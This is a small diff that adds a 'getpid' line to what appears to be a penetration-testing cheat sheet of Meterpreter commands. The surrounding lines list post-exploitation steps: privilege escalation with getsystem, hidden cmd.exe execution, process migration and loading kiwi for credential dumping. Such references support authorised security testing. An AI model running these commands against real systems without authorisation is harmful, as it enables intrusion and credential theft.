@@ -980,6 +980,7 @@ meterpreter > execute -f <cmd.exe> -i
 meterpreter > execute -f <cmd.exe> -i -H -t
 meterpreter > rev2self
 meterpreter > getsystem
+meterpreter > getpid
 meterpreter > ps
 meterpreter > migrate <PID>
 meterpreter > load kiwi
